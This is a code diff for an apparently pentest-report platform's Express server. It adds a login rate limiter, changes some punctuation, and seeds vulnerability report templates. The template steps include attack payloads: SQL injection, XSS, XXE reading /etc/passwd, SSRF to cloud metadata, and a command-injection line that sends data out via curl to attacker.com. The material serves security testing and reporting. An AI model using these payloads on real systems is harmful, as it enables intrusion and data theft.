@@ -143,8 +143,13 @@ const app = express();
 const TRUST_PROXY = process.env.TRUST_PROXY || "loopback";
 app.set('trust proxy', TRUST_PROXY === "false" ? false : /^\d+$/.test(TRUST_PROXY) ? Number(TRUST_PROXY) : TRUST_PROXY);
 
-const limiter = rateLimit({ windowMs: 15*60*1000, max: 200, standardHeaders: true, legacyHeaders: false });
-app.use(limiter);
+// 1.5.2: el límite general era de 200 pedidos y se aplicaba a todo, también a los archivos del panel que sirve este
+// mismo proceso. Con abrir unas cinco pantallas se gastaba y el panel quedaba en "Too many requests" 15 minutos.
+// Ahora, como en Gungnir Pro: 1000 pedidos de API cada 15 minutos y, aparte, 30 intentos de inicio de sesión.
+const limiter = rateLimit({ windowMs: 15*60*1000, max: 1000, standardHeaders: true, legacyHeaders: false });
+app.use("/api/", limiter);
+const loginLimiter = rateLimit({ windowMs: 15*60*1000, max: 30, standardHeaders: true, legacyHeaders: false,
+  message: { error: "Demasiados intentos de inicio de sesión. Intentá en 15 minutos." } });
 
 // 🔴 CSP: la que había bloqueaba el script en línea del tema y las fuentes de Google del panel
 // compilado, y helmet le sumaba upgrade-insecure-requests, que rompe una instalación por HTTP.
@@ -585,7 +590,7 @@ async function initDB() {
     FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL
   ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`);
 
-  // ── Attack Map — Targets ──────────────────────────────────────────────────
+  // ── Attack Map - Targets ──────────────────────────────────────────────────
   await qRun(`CREATE TABLE IF NOT EXISTS engagement_targets (
     id              VARCHAR(36)   NOT NULL PRIMARY KEY,
     engagement_id   VARCHAR(36)   NOT NULL,
@@ -756,15 +761,15 @@ async function initDB() {
   try {
     await qRun(`ALTER TABLE operation_logs ADD COLUMN outcome VARCHAR(20) NULL`);
   } catch(e) { /* columna ya existe */ }
-  // ── Migración: scope_items — enriquecimiento ──────────────────────────────
+  // ── Migración: scope_items - enriquecimiento ──────────────────────────────
   try { await qRun(`ALTER TABLE scope_items ADD COLUMN os_type VARCHAR(30) NULL DEFAULT NULL`); } catch(_) {}
   try { await qRun(`ALTER TABLE scope_items ADD COLUMN pwned TINYINT(1) NOT NULL DEFAULT 0`); } catch(_) {}
   try { await qRun(`ALTER TABLE scope_items ADD COLUMN ports JSON NULL DEFAULT NULL`); } catch(_) {}
   try { await qRun(`ALTER TABLE scope_items ADD COLUMN vuln_summary TEXT NULL DEFAULT NULL`); } catch(_) {}
-  // ── Migración: engagement_targets — agregar 'parrot' al ENUM os_type ─────
+  // ── Migración: engagement_targets - agregar 'parrot' al ENUM os_type ─────
   try { await qRun(`ALTER TABLE engagement_targets MODIFY os_type ENUM('windows','windowsserver','linux','ubuntu','debian','kali','parrot','arch','fedora','redhat','macos','router','server','firewall','switch','printer','nas','iot','camera','android','ios','freebsd','other') NOT NULL DEFAULT 'other'`); } catch(_) {}
 
-  // ── Migración: findings — ciclo de remediación y reprueba (retest) ───────
+  // ── Migración: findings - ciclo de remediación y reprueba (retest) ───────
   try { await qRun(`ALTER TABLE findings ADD COLUMN remediation_due_date DATE NULL DEFAULT NULL`); } catch(_) {}
   try { await qRun(`ALTER TABLE findings ADD COLUMN initial_severity ENUM('critical','high','medium','low','info') NULL DEFAULT NULL`); } catch(_) {}
   try { await qRun(`ALTER TABLE findings ADD COLUMN retest_status ENUM('not_retested','passed','failed','partial') NOT NULL DEFAULT 'not_retested'`); } catch(_) {}
@@ -823,63 +828,63 @@ async function initDB() {
     // Siembra idempotente: inserta los templates builtin que falten (por título).
     // Así una DB nueva los recibe todos, y una existente recibe los nuevos sin duplicar.
     const tpls = [
-      { title:"SQL Injection", category:"Injection", severity:"critical", cwe_id:"CWE-89", cwe_name:"Improper Neutralization of Special Elements used in an SQL Command", owasp:"A03:2021 – Injection", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", score:9.8,
+      { title:"SQL Injection", category:"Injection", severity:"critical", cwe_id:"CWE-89", cwe_name:"Improper Neutralization of Special Elements used in an SQL Command", owasp:"A03:2021 - Injection", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", score:9.8,
         desc:"La aplicación construye consultas SQL concatenando directamente datos controlados por el usuario sin sanitización ni parametrización. Esto permite a un atacante modificar la lógica de la consulta para extraer datos arbitrarios, eludir autenticación o ejecutar operaciones destructivas en la base de datos.",
         steps:"1. Identificar parámetros de entrada reflejados en consultas SQL (formularios de login, búsqueda, filtros).\n2. Enviar payload básico: ' OR 1=1-- para verificar la vulnerabilidad.\n3. Usar sqlmap o técnica manual para enumerar tablas: ' UNION SELECT NULL,table_name FROM information_schema.tables-- \n4. Extraer credenciales u otros datos sensibles.",
         rec:"Usar consultas parametrizadas (prepared statements) en todos los accesos a base de datos. Implementar ORM con consultas tipadas. Aplicar principio de mínimo privilegio en el usuario de base de datos. Validar y sanitizar toda entrada del usuario. Implementar WAF como capa adicional."},
-      { title:"Cross-Site Scripting (XSS) Reflejado", category:"XSS", severity:"high", cwe_id:"CWE-79", cwe_name:"Improper Neutralization of Input During Web Page Generation", owasp:"A03:2021 – Injection", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", score:6.1,
+      { title:"Cross-Site Scripting (XSS) Reflejado", category:"XSS", severity:"high", cwe_id:"CWE-79", cwe_name:"Improper Neutralization of Input During Web Page Generation", owasp:"A03:2021 - Injection", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", score:6.1,
         desc:"La aplicación refleja datos de entrada del usuario en la respuesta HTML sin codificación adecuada, permitiendo la inyección y ejecución de código JavaScript arbitrario en el navegador de la víctima.",
         steps:"1. Identificar parámetros reflejados en la respuesta: ?q=test, campos de búsqueda, mensajes de error.\n2. Inyectar payload básico: <script>alert(1)</script>\n3. Probar bypass de filtros: <img src=x onerror=alert(1)>, <svg onload=alert(1)>\n4. Demostrar impacto: robo de cookies de sesión con document.cookie",
         rec:"Implementar encoding contextual de output: htmlEncode() para HTML, encodeURIComponent() para URLs, encodeForJS() para JavaScript. Usar Content Security Policy (CSP) estricto. Implementar HttpOnly y Secure flags en cookies. Validar y rechazar entradas con caracteres especiales innecesarios."},
-      { title:"Server-Side Request Forgery (SSRF)", category:"SSRF", severity:"high", cwe_id:"CWE-918", cwe_name:"Server-Side Request Forgery", owasp:"A10:2021 – SSRF", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", score:8.6,
+      { title:"Server-Side Request Forgery (SSRF)", category:"SSRF", severity:"high", cwe_id:"CWE-918", cwe_name:"Server-Side Request Forgery", owasp:"A10:2021 - SSRF", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", score:8.6,
         desc:"La aplicación acepta URLs controladas por el usuario para realizar solicitudes HTTP del lado del servidor. Un atacante puede abusar de esta funcionalidad para acceder a servicios internos no expuestos, leer metadata de instancias cloud (AWS IMDSv1, Azure IMDS) o escanear la red interna.",
         steps:"1. Identificar funcionalidades que realizan fetch/HTTP de URLs: webhooks, importación de recursos, preview de URLs.\n2. Probar con URL interna: http://127.0.0.1/admin, http://10.0.0.1:8080\n3. Probar metadata cloud: http://169.254.169.254/latest/meta-data/ (AWS)\n4. Usar Burp Collaborator o interactsh para detectar SSRF ciego.",
         rec:"Implementar allowlist estricta de dominios/IPs permitidos. Resolver y validar la IP de destino antes de realizar la solicitud (bloquear RFC1918, 127.0.0.0/8, 169.254.0.0/16). Usar IMDSv2 en AWS. Deshabilitar redireccionamientos automáticos. Ejecutar el componente de fetch en una red aislada."},
-      { title:"Insecure Direct Object Reference (IDOR)", category:"Broken Access Control", severity:"high", cwe_id:"CWE-639", cwe_name:"Authorization Bypass Through User-Controlled Key", owasp:"A01:2021 – Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", score:6.5,
+      { title:"Insecure Direct Object Reference (IDOR)", category:"Broken Access Control", severity:"high", cwe_id:"CWE-639", cwe_name:"Authorization Bypass Through User-Controlled Key", owasp:"A01:2021 - Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", score:6.5,
         desc:"La aplicación expone referencias directas a objetos internos (IDs, UUIDs, nombres de archivo) sin verificar que el usuario autenticado tiene autorización para acceder al recurso específico solicitado.",
         steps:"1. Autenticarse con usuario A, identificar ID de objeto en la respuesta (ej: /api/facturas/1234).\n2. Cambiar el ID al de otro usuario (ej: /api/facturas/1235) sin cambiar el token de autenticación.\n3. Si la respuesta devuelve datos del otro usuario, la vulnerabilidad está confirmada.\n4. Enumerar IDs para mapear objetos accesibles.",
         rec:"Implementar autorización a nivel de objeto en cada endpoint: verificar que req.user.id === recurso.owner_id. Usar UUIDs aleatorios en vez de IDs secuenciales. Implementar middleware de autorización centralizado. Auditar todos los endpoints de API con herramientas automatizadas de autorización."},
-      { title:"Authentication Bypass", category:"Authentication", severity:"critical", cwe_id:"CWE-287", cwe_name:"Improper Authentication", owasp:"A07:2021 – Identification and Authentication Failures", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", score:9.8,
+      { title:"Authentication Bypass", category:"Authentication", severity:"critical", cwe_id:"CWE-287", cwe_name:"Improper Authentication", owasp:"A07:2021 - Identification and Authentication Failures", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", score:9.8,
         desc:"El mecanismo de autenticación de la aplicación puede ser eludido sin credenciales válidas, permitiendo a un atacante acceder a funcionalidades protegidas o suplantación de identidad.",
         steps:"1. Analizar el flujo de autenticación (tokens, cookies, parámetros de sesión).\n2. Intentar manipulación de tokens JWT: cambiar algoritmo a 'none', modificar claims sin firma válida.\n3. Probar bypass de lógica: omitir pasos del flujo MFA, manipular estado de sesión.\n4. Verificar acceso a endpoints protegidos sin token.",
         rec:"Usar librerías de autenticación probadas. Validar firma de JWT con algoritmo fijo (nunca 'none'). Implementar MFA robusto. Invalidar sesiones en el servidor al logout. Usar tokens de sesión con entropía suficiente (≥128 bits). Implementar rate limiting en endpoints de autenticación."},
-      { title:"Command Injection", category:"Injection", severity:"critical", cwe_id:"CWE-78", cwe_name:"Improper Neutralization of Special Elements used in an OS Command", owasp:"A03:2021 – Injection", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", score:9.8,
+      { title:"Command Injection", category:"Injection", severity:"critical", cwe_id:"CWE-78", cwe_name:"Improper Neutralization of Special Elements used in an OS Command", owasp:"A03:2021 - Injection", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", score:9.8,
         desc:"La aplicación pasa datos controlados por el usuario a funciones de ejecución de comandos del sistema operativo sin sanitización adecuada, permitiendo la ejecución de comandos arbitrarios con los privilegios del proceso de la aplicación.",
         steps:"1. Identificar funcionalidades que interactúan con el SO: ping, whois, conversión de archivos, generación de imágenes.\n2. Inyectar separadores de comandos: ; id, && id, | id, `id`\n3. Probar caracteres especiales de shell: $(), <>|;\n4. Exfiltrar datos con: ; curl http://attacker.com/$(whoami)",
         rec:"Nunca pasar datos de usuario a exec(), system(), popen() o equivalentes. Si se requiere llamar al SO, usar APIs de librería nativas (ej: libpng en vez de llamar a convert). Usar allowlists estrictas de caracteres permitidos. Ejecutar la aplicación con el menor privilegio posible."},
-      { title:"XML External Entity (XXE) Injection", category:"Injection", severity:"high", cwe_id:"CWE-611", cwe_name:"Improper Restriction of XML External Entity Reference", owasp:"A05:2021 – Security Misconfiguration", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L", score:8.2,
+      { title:"XML External Entity (XXE) Injection", category:"Injection", severity:"high", cwe_id:"CWE-611", cwe_name:"Improper Restriction of XML External Entity Reference", owasp:"A05:2021 - Security Misconfiguration", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L", score:8.2,
         desc:"El parser XML de la aplicación está configurado para procesar entidades externas, permitiendo a un atacante leer archivos del sistema, realizar peticiones SSRF o causar denegación de servicio mediante ataques de expansión de entidades (Billion Laughs).",
         steps:"1. Identificar endpoints que aceptan XML: uploads, SOAP, configuraciones, exportaciones.\n2. Inyectar payload XXE básico para leer /etc/passwd:\n<!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>\n3. Probar XXE a través de SSRF: SYSTEM 'http://169.254.169.254/'\n4. Intentar XXE ciego con out-of-band: SYSTEM 'http://collaborator/'",
         rec:"Deshabilitar completamente el procesamiento de DTD/entidades externas en el parser XML. Usar parsers seguros por defecto (defusedxml en Python, FEATURE_SECURE_PROCESSING en Java). Actualizar librerías XML a versiones parcheadas. Considerar usar JSON en vez de XML donde sea posible."},
-      { title:"Sensitive Data Exposure", category:"Cryptography", severity:"high", cwe_id:"CWE-200", cwe_name:"Exposure of Sensitive Information to an Unauthorized Actor", owasp:"A02:2021 – Cryptographic Failures", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", score:7.5,
+      { title:"Sensitive Data Exposure", category:"Cryptography", severity:"high", cwe_id:"CWE-200", cwe_name:"Exposure of Sensitive Information to an Unauthorized Actor", owasp:"A02:2021 - Cryptographic Failures", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", score:7.5,
         desc:"La aplicación transmite o almacena datos sensibles (contraseñas, tokens, PII, datos de tarjetas) sin cifrado adecuado o con algoritmos débiles, exponiendo la información a actores no autorizados.",
         steps:"1. Analizar tráfico HTTP/S con Burp Suite para detectar datos sensibles en texto plano.\n2. Verificar headers de seguridad: HSTS, Secure flag en cookies.\n3. Revisar fuente de la página y comentarios HTML.\n4. Analizar respuestas de API para datos sensibles innecesarios en JSON.",
         rec:"Implementar TLS 1.2+ en todos los endpoints. Habilitar HSTS. Cifrar datos sensibles en reposo (AES-256). Usar hashing robusto para contraseñas (bcrypt, Argon2id). Implementar principio de mínima exposición de datos en APIs. No incluir datos sensibles en logs."},
-      { title:"Security Misconfiguration", category:"Configuration", severity:"medium", cwe_id:"CWE-16", cwe_name:"Configuration", owasp:"A05:2021 – Security Misconfiguration", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N", score:6.5,
+      { title:"Security Misconfiguration", category:"Configuration", severity:"medium", cwe_id:"CWE-16", cwe_name:"Configuration", owasp:"A05:2021 - Security Misconfiguration", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N", score:6.5,
         desc:"La aplicación o su infraestructura presenta configuraciones inseguras por defecto: servicios innecesarios habilitados, headers de seguridad ausentes, stack traces expuestos, credenciales por defecto, o permisos incorrectos.",
         steps:"1. Escanear con Nikto, nuclei o OWASP ZAP para configuraciones comunes.\n2. Verificar headers de seguridad: X-Frame-Options, X-Content-Type-Options, CSP, HSTS.\n3. Buscar rutas de administración expuestas: /admin, /phpinfo.php, /.git/\n4. Verificar mensajes de error detallados y stack traces.",
         rec:"Hardening del servidor web: deshabilitar directory listing, eliminar páginas de error por defecto. Implementar todos los security headers. Remover componentes y funcionalidades no utilizadas. Revisar permisos de archivos y directorios. Implementar proceso de hardening documentado para deployments."},
-      { title:"Broken Access Control", category:"Authorization", severity:"critical", cwe_id:"CWE-284", cwe_name:"Improper Access Control", owasp:"A01:2021 – Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", score:8.8,
+      { title:"Broken Access Control", category:"Authorization", severity:"critical", cwe_id:"CWE-284", cwe_name:"Improper Access Control", owasp:"A01:2021 - Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", score:8.8,
         desc:"La aplicación no implementa correctamente los controles de acceso, permitiendo a usuarios acceder a funcionalidades o datos fuera de sus permisos asignados, incluyendo funciones administrativas.",
         steps:"1. Mapear todos los roles y permisos de la aplicación.\n2. Con usuario de bajo privilegio, intentar acceder a endpoints/funciones de admin.\n3. Manipular tokens JWT para escalar privilegios (cambiar role en payload).\n4. Forzar navegación directa a URLs protegidas omitiendo la UI.",
         rec:"Implementar modelo de control de acceso centralizado basado en roles (RBAC). Validar permisos en el servidor en cada request, nunca confiar en validaciones del cliente. Denegar acceso por defecto, otorgar permisos explícitamente. Registrar y alertar intentos de acceso no autorizado. Implementar pruebas automatizadas de autorización."},
-      { title:"Path Traversal", category:"File Access", severity:"high", cwe_id:"CWE-22", cwe_name:"Improper Limitation of a Pathname to a Restricted Directory", owasp:"A01:2021 – Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", score:7.5,
+      { title:"Path Traversal", category:"File Access", severity:"high", cwe_id:"CWE-22", cwe_name:"Improper Limitation of a Pathname to a Restricted Directory", owasp:"A01:2021 - Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", score:7.5,
         desc:"La aplicación usa datos controlados por el usuario para construir rutas de archivos sin validación adecuada, permitiendo a un atacante acceder a archivos fuera del directorio permitido usando secuencias de traversal (../).",
         steps:"1. Identificar parámetros que referencian archivos: ?file=, ?path=, ?template=\n2. Inyectar payloads de traversal: ../../../etc/passwd, ..\\..\\..\\windows\\win.ini\n3. Probar encodings: %2e%2e%2f, %252e%252e%252f (doble encoding)\n4. En uploads, enviar filename: ../../important_file.php",
         rec:"Usar funciones de resolución de paths seguros y verificar que el path resuelto comienza con el directorio base esperado. Usar allowlist de nombres de archivo/extensiones. Almacenar archivos con nombres generados internamente, no nombres del usuario. Implementar chroot o containers para limitar el filesystem accesible."},
-      { title:"Weak Password Policy", category:"Authentication", severity:"medium", cwe_id:"CWE-521", cwe_name:"Weak Password Requirements", owasp:"A07:2021 – Identification and Authentication Failures", cvss:"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", score:8.1,
+      { title:"Weak Password Policy", category:"Authentication", severity:"medium", cwe_id:"CWE-521", cwe_name:"Weak Password Requirements", owasp:"A07:2021 - Identification and Authentication Failures", cvss:"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", score:8.1,
         desc:"La aplicación no impone una política de contraseñas suficientemente robusta, permitiendo contraseñas cortas, simples o previamente comprometidas, facilitando ataques de fuerza bruta o credential stuffing.",
         steps:"1. Crear cuenta con contraseñas débiles: '123456', 'password', 'admin123'\n2. Verificar si acepta contraseñas de menos de 8 caracteres.\n3. Probar si bloquea contraseñas de listas de breaches (Have I Been Pwned).\n4. Verificar ausencia de MFA o su carácter opcional.",
         rec:"Requerir mínimo 12 caracteres, combinación de mayúsculas, minúsculas, números y caracteres especiales. Implementar verificación contra listas de contraseñas comprometidas (HIBP API). Implementar MFA obligatorio para roles privilegiados. Limitar intentos de login (5 intentos → bloqueo 15 min). Alertar al usuario sobre logins desde IPs/dispositivos nuevos."},
-      { title:"Cross-Site Request Forgery (CSRF)", category:"CSRF", severity:"medium", cwe_id:"CWE-352", cwe_name:"Cross-Site Request Forgery", owasp:"A01:2021 – Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", score:6.5,
+      { title:"Cross-Site Request Forgery (CSRF)", category:"CSRF", severity:"medium", cwe_id:"CWE-352", cwe_name:"Cross-Site Request Forgery", owasp:"A01:2021 - Broken Access Control", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", score:6.5,
         desc:"La aplicación no implementa protección CSRF en endpoints con acciones de estado (POST/PUT/DELETE), permitiendo a un atacante inducir a un usuario autenticado a realizar acciones no intencionadas a través de un sitio malicioso.",
         steps:"1. Identificar formularios/peticiones sin token CSRF.\n2. Crear página HTML maliciosa con auto-submit form apuntando al endpoint vulnerable.\n3. Verificar si la acción se ejecuta cuando un usuario autenticado visita la página maliciosa.\n4. Confirmar ausencia del header Origin/Referer validation.",
         rec:"Implementar tokens CSRF sincronizados (doble submit cookie o server-side token). Verificar header Origin/Referer. Usar SameSite=Strict o SameSite=Lax en cookies de sesión. Requerir autenticación adicional (re-ingreso de contraseña) para acciones críticas. Usar APIs JSON (no aceptan cross-origin POSTs de formularios HTML)."},
-      { title:"Subdomain Takeover", category:"Infrastructure", severity:"high", cwe_id:"CWE-350", cwe_name:"Reliance on Reverse DNS Resolution for a Security-Critical Action", owasp:"A05:2021 – Security Misconfiguration", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", score:8.1,
+      { title:"Subdomain Takeover", category:"Infrastructure", severity:"high", cwe_id:"CWE-350", cwe_name:"Reliance on Reverse DNS Resolution for a Security-Critical Action", owasp:"A05:2021 - Security Misconfiguration", cvss:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", score:8.1,
         desc:"Un subdominio de la organización apunta (CNAME) a un servicio externo (GitHub Pages, S3, Heroku, etc.) que ya no está siendo utilizado. Un atacante puede reclamar ese servicio externo y controlar el contenido servido bajo el subdominio legítimo.",
         steps:"1. Enumerar subdominios con amass, subfinder, assetfinder.\n2. Verificar registros CNAME que apuntan a servicios cloud.\n3. Comprobar si el servicio externo está activo o puede ser reclamado.\n4. Intentar reclamar el servicio externo (ej: crear repositorio GitHub Pages con el mismo nombre).",
         rec:"Auditar periódicamente todos los registros DNS de la organización. Eliminar registros DNS apuntando a recursos externos al deshabilitar servicios. Implementar proceso de offboarding que incluya limpieza de DNS. Monitorear continuamente subdominios con herramientas automatizadas (nuclei templates de takeover)."},
-      { title:"Deserialization Insegura", category:"Deserialization", severity:"critical", cwe_id:"CWE-502", cwe_name:"Deserialization of Untrusted Data", owasp:"A08:2021 – Software and Data Integrity Failures", cvss:"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", score:8.1,
+      { title:"Deserialization Insegura", category:"Deserialization", severity:"critical", cwe_id:"CWE-502", cwe_name:"Deserialization of Untrusted Data", owasp:"A08:2021 - Software and Data Integrity Failures", cvss:"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", score:8.1,
         desc:"La aplicación deserializa datos controlados por el usuario sin validación, permitiendo a un atacante modificar el estado del objeto deserializado o ejecutar código arbitrario (RCE) mediante gadget chains de la librería de clases del runtime.",
         steps:"1. Identificar datos serializados: cookies Base64 que comienzan con 'rO0AB' (Java), 'a:' (PHP), '\\x80\\x04' (Python pickle).\n2. Modificar el objeto serializado para cambiar campos como isAdmin, userId.\n3. Usar ysoserial (Java) para generar gadget chains de RCE.\n4. Explotar mediante pickle.loads() en Python con payload de ejecución de comandos.",
         rec:"Nunca deserializar datos controlados por el usuario. Usar formatos de datos simples (JSON, XML con schema) en vez de serialización nativa. Si se requiere serialización, firmar criptográficamente los datos antes de deserializar. Implementar ObjectInputStream personalizado que solo acepte clases en allowlist (Java). Ejecutar en sandbox con mínimos privilegios."},
@@ -997,7 +1002,7 @@ const APP_VERSION = require("./package.json").version;
 app.get("/api/health", (_, res) => res.json({ ok: true, system: "Gungnir", version: APP_VERSION }));
 
 // ── AUTH ──────────────────────────────────────────────────────────────────────
-app.post("/api/auth/login", async (req, res) => {
+app.post("/api/auth/login", loginLimiter, async (req, res) => {
   const { username, password, totp_token } = req.body;
   if (!username || !password) return res.status(400).json({ error: "Faltan campos" });
 
@@ -1291,7 +1296,7 @@ app.put("/api/engagements/:id/phase", auth(ESCRIBEN), async (req, res) => {
   res.json({ ok: true, current_phase: phase });
 });
 
-// PUT /api/engagements/:id/phases/:phase/status — marcar fase como completed/in_progress/not_started
+// PUT /api/engagements/:id/phases/:phase/status - marcar fase como completed/in_progress/not_started
 app.put("/api/engagements/:id/phases/:phase/status", auth(ESCRIBEN), async (req, res) => {
   const { status } = req.body;
   if (!['not_started','in_progress','completed'].includes(status)) return res.status(400).json({ error: "Status inválido" });
@@ -1527,7 +1532,7 @@ app.post("/api/engagements/:id/scope/sync-from-phases", auth(ESCRIBEN), async (r
   }
 });
 
-// ── ATTACK MAP — TARGETS ──────────────────────────────────────────────────────
+// ── ATTACK MAP - TARGETS ──────────────────────────────────────────────────────
 app.get("/api/engagements/:id/targets", auth(), async (req, res) => {
   res.json(await qRows("SELECT * FROM engagement_targets WHERE engagement_id=? ORDER BY created_at", [req.params.id]));
 });
@@ -1885,7 +1890,7 @@ app.post("/api/engagements/:id/attack-map/sync-from-phases", auth(ESCRIBEN), asy
   }
 });
 
-// Attack Map data — nodos y edges para vis-network
+// Attack Map data - nodos y edges para vis-network
 app.get("/api/engagements/:id/attack-map", auth(), async (req, res) => {
   const targets = await qRows("SELECT * FROM engagement_targets WHERE engagement_id=? ORDER BY created_at", [req.params.id]);
   const tids = targets.map(t => t.id);
@@ -2262,7 +2267,7 @@ app.post("/api/auth/totp/setup", auth(), async (req, res) => {
   if (!user || !await bcrypt.compare(password, user.password_hash)) return res.status(400).json({ error: "Contraseña incorrecta" });
   if (user.totp_enabled) return res.status(400).json({ error: "2FA ya está activo" });
   const secret = generateTotpSecret();
-  // Guardar secreto provisionalmente (no habilitar aún — se habilita tras verificar)
+  // Guardar secreto provisionalmente (no habilitar aún - se habilita tras verificar)
   await qRun("UPDATE users SET totp_secret=? WHERE id=?", [secret, req.user.id]);
   // ⚠️ El nombre de cuenta se escapa dentro de `uriDeAlta`. Armarlo a mano y volver a
   // codificarlo rompe el QR para cualquier usuario con ':' o '&' en el nombre.
@@ -2566,7 +2571,7 @@ function parseNmap(xml) {
       const svcVersion = svcMatch ? (xmlGetAttr(svcMatch[0],'service','version')||'') : '';
       const extraInfo  = svcMatch ? (xmlGetAttr(svcMatch[0],'service','extrainfo')||'') : '';
       const svcLabel = [svcName.toUpperCase(), svcProduct, svcVersion].filter(Boolean).join(' ');
-      const title = `Open Port ${portId}/${proto}${svcLabel ? ' — ' + svcLabel : ''}`;
+      const title = `Open Port ${portId}/${proto}${svcLabel ? ' - ' + svcLabel : ''}`;
       const descParts = [];
       if (svcProduct || svcVersion) descParts.push(`Service: ${[svcProduct,svcVersion].filter(Boolean).join(' ')}`);
       if (extraInfo) descParts.push(`Details: ${extraInfo}`);
@@ -2970,7 +2975,7 @@ app.get("/api/engagements/:id/export", auth(), async (req, res) => {
   } catch (e) { console.error("Export error:", e); res.status(500).json({ error: "Error al generar el export" }); }
 });
 
-// EXPORT CSV — los hallazgos del engagement en una planilla.
+// EXPORT CSV - los hallazgos del engagement en una planilla.
 function csvEscape(v) {
   if (v === null || v === undefined) return "";
   const s = String(v);
@@ -3122,7 +3127,7 @@ app.post("/api/engagements/import", auth(["admin","auditor"]), importUpload.sing
       const newFn = fileMap[ev.filename];
       if (!newFn) {
         evidenceImportStats.skipped.push({ filename: ev.filename, reason: 'no_file_in_zip' });
-        console.warn(`[import] evidence skipped — filename "${ev.filename}" not found in fileMap. fileMap keys: ${Object.keys(fileMap).join(', ')}`);
+        console.warn(`[import] evidence skipped - filename "${ev.filename}" not found in fileMap. fileMap keys: ${Object.keys(fileMap).join(', ')}`);
         continue;
       }
       await qRun("INSERT INTO evidences (id,engagement_id,finding_id,phase_type,filename,original_name,file_type,file_size,caption,uploaded_by) VALUES (?,?,?,?,?,?,?,?,?,?)", [uuidv4(), newEngId, findingIdMap[ev.finding_id]||null, ev.phase_type||null, newFn, ev.original_name, ev.file_type, ev.file_size, ev.caption||null, req.user.id]);
@@ -3172,7 +3177,7 @@ app.post("/api/engagements/import", auth(["admin","auditor"]), importUpload.sing
          tech.tactic||null, tech.tool||null, tech.notes||null, req.user.id]
       );
     }
-    // ── Attack Map — targets ─────────────────────────────────────────────────
+    // ── Attack Map - targets ─────────────────────────────────────────────────
     const targetIdMap = {};
     for (const tgt of (manifest.targets || [])) {
       const newTid = uuidv4();
@@ -3206,7 +3211,7 @@ app.post("/api/engagements/import", auth(["admin","auditor"]), importUpload.sing
       );
     }
     const imported = await qRow("SELECT e.*, c.name AS client_name FROM engagements e JOIN clients c ON c.id=e.client_id WHERE e.id=?", [newEngId]);
-    console.log(`[import] OK — eng ${newEngId} | fileMap keys: ${Object.keys(fileMap).length} | evidences: ${evidenceImportStats.imported}/${evidenceImportStats.total}`);
+    console.log(`[import] OK - eng ${newEngId} | fileMap keys: ${Object.keys(fileMap).length} | evidences: ${evidenceImportStats.imported}/${evidenceImportStats.total}`);
     if (evidenceImportStats.skipped.length) console.warn('[import] evidences skipped:', JSON.stringify(evidenceImportStats.skipped));
     res.status(201).json({ ok: true, engagement: imported, _import_stats: { evidences: evidenceImportStats, files_in_zip: Object.keys(fileMap).length } });
   } catch (e) { console.error("Import error:", e); res.status(500).json({ error: `Error al importar: ${e.message}` }); }
@@ -3254,11 +3259,11 @@ app.get("/api/engagements/:id/attack-navigator.json", auth(), async (req, res) =
   const techniques = [...vistas.entries()].map(([id, t]) => ({
     techniqueID: id,
     color: _COLOR_FASE[t.phase_type] || "#e8192c",
-    comment: [t.name, t.tactic, t.notes].filter(Boolean).join(" — ").slice(0, 500),
+    comment: [t.name, t.tactic, t.notes].filter(Boolean).join(" - ").slice(0, 500),
     enabled: true,
   }));
   const layer = {
-    name: `Gungnir — ${eng.name}`.slice(0, 120),
+    name: `Gungnir - ${eng.name}`.slice(0, 120),
     versions: { attack: "14", navigator: "4.9", layer: "4.5" },
     domain: "enterprise-attack",
